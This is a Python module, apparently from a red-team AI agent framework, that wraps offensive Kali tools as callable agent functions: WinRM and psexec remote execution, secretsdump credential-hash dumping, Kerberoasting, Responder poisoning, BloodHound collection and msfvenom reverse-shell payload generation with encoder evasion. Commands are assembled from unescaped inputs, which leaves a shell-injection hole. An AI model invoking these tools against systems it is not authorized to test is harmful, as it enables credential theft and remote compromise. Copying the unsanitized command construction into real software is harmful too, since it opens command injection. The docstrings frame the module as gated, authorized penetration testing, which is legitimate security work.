"""F203.BD — RED_TEAM-gated Kali tools (Group 2).

Wrappers @function_tool para herramientas intrusive de AD / exploit
post-compromise. Solo se registran cuando KRYON_RED_TEAM=true. NUNCA
correr contra producción banking sin autorización escrita.

Tools wrapped:
  - evil_winrm_shell        — Windows WinRM interactive shell
  - impacket_secretsdump    — dump NTDS.dit / SAM
  - impacket_psexec         — remote execution via SMB
  - impacket_getuserspns    — Kerberoasting prep
  - responder_listen        — LLMNR/NBT-NS/MDNS poisoning (analyze mode)
  - bloodhound_collect      — AD graph collection (BloodHound.py)
  - msfvenom_payload        — Metasploit payload generator

Banca-safe contract:
  - evil_winrm_shell: read-only command execution (operator define qué exec)
  - secretsdump: dumps hashes (intrusive — REQUIERE creds previas + ROE)
  - psexec: remote exec via SMB (intrusive — REQUIERE creds + ROE)
  - getuserspns: TGS request para SPNs (analytical, low impact)
  - responder: -A flag (analyze only, no poisoning)
  - bloodhound-python: read-only LDAP collection
  - msfvenom: genera payload binary local (no exec target)
"""

from __future__ import annotations

from kryon.sdk.agents import function_tool
from kryon.tools.common import run_command


@function_tool
def evil_winrm_shell(
    target_host: str,
    user: str,
    password: str = "",
    nthash: str = "",
    command: str = "whoami",
    ctf=None,
) -> str:
    """Run a single command via evil-winrm (Windows WinRM, port 5985/5986).

    REQUIERE auth válida (password o NTLM hash). NO interactive shell —
    una comand string per invocation (re-llamar para chain).

    Args:
        target_host: target IP or hostname.
        user: WinRM user.
        password: cleartext password.
        nthash: NTLM hash for pass-the-hash (alternative to password).
        command: single PowerShell command to execute.
        ctf: CTF context.

    Returns:
        str: command output.
    """
    cmd_parts = ["evil-winrm", f"-i {target_host}", f"-u {user}"]
    if nthash:
        cmd_parts.append(f"-H {nthash}")
    elif password:
        cmd_parts.append(f"-p '{password}'")
    cmd_parts.append(f"-c '{command}'")
    return run_command(" ".join(cmd_parts), ctf=ctf)


@function_tool
def impacket_secretsdump(
    target_host: str,
    user: str,
    password: str = "",
    nthash: str = "",
    domain: str = "",
    extra_args: str = "",
    ctf=None,
) -> str:
    """Dump NTDS.dit / SAM hashes via impacket-secretsdump.

    INTRUSIVE — requires admin/DC creds. Output incluye hashes en
    formato pwdump (parsable por hashcat -m 1000).

    Args:
        target_host: target IP (DC or workstation con SAM).
        user: account (Domain Admin or local Admin).
        password: cleartext password.
        nthash: NTLM hash for pass-the-hash (alternative).
        domain: AD domain (empty = local SAM).
        extra_args: passthrough (e.g. "-just-dc" for NTDS only).
        ctf: CTF context.

    Returns:
        str: secretsdump output (hashes + Kerberos keys).
    """
    spec = f"{user}:{password}@{target_host}" if password else f"{user}@{target_host}"
    if domain:
        spec = f"{domain}/{spec}"
    cmd_parts = ["impacket-secretsdump", spec]
    if nthash:
        cmd_parts.append(f"-hashes :{nthash}")
    if extra_args:
        cmd_parts.append(extra_args)
    return run_command(" ".join(cmd_parts), ctf=ctf)


@function_tool
def impacket_psexec(
    target_host: str,
    user: str,
    password: str = "",
    nthash: str = "",
    domain: str = "",
    command: str = "whoami",
    ctf=None,
) -> str:
    """Remote execution via impacket-psexec (SMB-based).

    INTRUSIVE — drops a binary in ADMIN$ share, executes via service
    creation. Visible en logs Windows. Requires admin SMB access.

    Args:
        target_host: target IP.
        user: account with SMB admin.
        password: cleartext.
        nthash: NTLM hash (PTH).
        domain: AD domain.
        command: command to execute (default whoami).
        ctf: CTF context.

    Returns:
        str: psexec output (command stdout).
    """
    spec = f"{user}:{password}@{target_host}" if password else f"{user}@{target_host}"
    if domain:
        spec = f"{domain}/{spec}"
    cmd_parts = ["impacket-psexec", spec]
    if nthash:
        cmd_parts.append(f"-hashes :{nthash}")
    cmd_parts.append(f"'{command}'")
    return run_command(" ".join(cmd_parts), ctf=ctf)


@function_tool
def impacket_getuserspns(
    domain: str,
    user: str,
    password: str = "",
    nthash: str = "",
    request_tgs: bool = True,
    dc_ip: str = "",
    ctf=None,
) -> str:
    """Kerberoasting prep — list SPNs + optionally request TGS tickets.

    Banca-careful: requires authenticated AD user. TGS requests son
    actividad normal Kerberos pero pueden alertarse en SIEM cuando
    se piden muchos a la vez.

    Args:
        domain: AD FQDN (e.g. corp.example.com).
        user: AD user (any authenticated).
        password: cleartext.
        nthash: NTLM hash (alternative).
        request_tgs: include -request flag (default True — pide TGSs
            crackeables offline).
        dc_ip: -dc-ip if DC discovery falla.
        ctf: CTF context.

    Returns:
        str: SPNs listing + TGS hashes (Kerberoasting format).
    """
    spec = f"{domain}/{user}:{password}" if password else f"{domain}/{user}"
    cmd_parts = ["impacket-GetUserSPNs", spec]
    if nthash:
        cmd_parts.append(f"-hashes :{nthash}")
    if request_tgs:
        cmd_parts.append("-request")
    if dc_ip:
        cmd_parts.append(f"-dc-ip {dc_ip}")
    return run_command(" ".join(cmd_parts), ctf=ctf)


@function_tool
def responder_listen(
    interface: str = "eth0",
    analyze_only: bool = True,
    duration_seconds: int = 60,
    ctf=None,
) -> str:
    """Run responder for LLMNR/NBT-NS/MDNS poisoning (or analyze mode).

    Banca-safe DEFAULT (analyze_only=True): observa el traffic broadcast
    pero NO responde (no MITM). analyze_only=False activa poisoning real
    — INTRUSIVE, capturable como ataque MITM.

    Args:
        interface: network interface (default eth0).
        analyze_only: -A flag (analyze without responding, default True).
        duration_seconds: how long to listen (timeout wrapper).
        ctf: CTF context.

    Returns:
        str: responder output (observed names + responses).
    """
    cmd_parts = ["timeout", str(duration_seconds), "responder", f"-I {interface}"]
    if analyze_only:
        cmd_parts.append("-A")
    return run_command(" ".join(cmd_parts), ctf=ctf)


@function_tool
def bloodhound_collect(
    domain: str,
    user: str,
    password: str = "",
    nthash: str = "",
    dc_ip: str = "",
    collection_methods: str = "Default",
    output_dir: str = "/tmp/bh_output",
    ctf=None,
) -> str:
    """Run bloodhound-python (BloodHound.py) for AD graph collection.

    Banca-safe: LDAP read-only enumeration. Output JSONs son importables
    a BloodHound GUI para path analysis (Domain Admin discovery).

    Args:
        domain: AD FQDN.
        user: authenticated AD user.
        password: cleartext.
        nthash: NTLM hash (alternative).
        dc_ip: DC IP if discovery falla.
        collection_methods: -c flag. Options: "Default" (Group, LocalAdmin,
            Session, Trusts), "All" (everything, slower), "DCOnly" (no
            agent-equivalent collections).
        output_dir: where to write *.json files.
        ctf: CTF context.

    Returns:
        str: bloodhound-python output (collection summary).
    """
    cmd_parts = [
        "bloodhound-python",
        f"-d {domain}",
        f"-u {user}",
        f"-c {collection_methods}",
        f"--zip --no-pass --output {output_dir}",
    ]
    if password:
        cmd_parts.append(f"-p '{password}'")
    if nthash:
        cmd_parts.append(f"--hashes :{nthash}")
    if dc_ip:
        cmd_parts.append(f"-dc {dc_ip} -ns {dc_ip}")
    return run_command(" ".join(cmd_parts), ctf=ctf)


@function_tool
def msfvenom_payload(
    payload: str,
    lhost: str,
    lport: int = 4444,
    format: str = "elf",
    output_path: str = "/tmp/payload.bin",
    extra_args: str = "",
    ctf=None,
) -> str:
    """Generate Metasploit payload binary (no exec, file output only).

    Banca-safe: genera el payload binary en disco local, NO lo entrega
    al target. Operator es responsable de deployment + ROE.

    Args:
        payload: msfvenom payload (e.g. linux/x64/meterpreter/reverse_tcp,
            windows/x64/shell_reverse_tcp, php/meterpreter_reverse_tcp).
        lhost: LHOST (attacker IP for callback).
        lport: LPORT (default 4444).
        format: output format (elf, exe, dll, asp, war, php, raw, etc.).
        output_path: -o file path.
        extra_args: passthrough (e.g. "-i 3 -e x86/shikata_ga_nai").
        ctf: CTF context.

    Returns:
        str: msfvenom output (payload size + write confirmation).
    """
    cmd_parts = [
        "msfvenom",
        f"-p {payload}",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        f"-f {format}",
        f"-o {output_path}",
    ]
    if extra_args:
        cmd_parts.append(extra_args)
    return run_command(" ".join(cmd_parts), ctf=ctf)
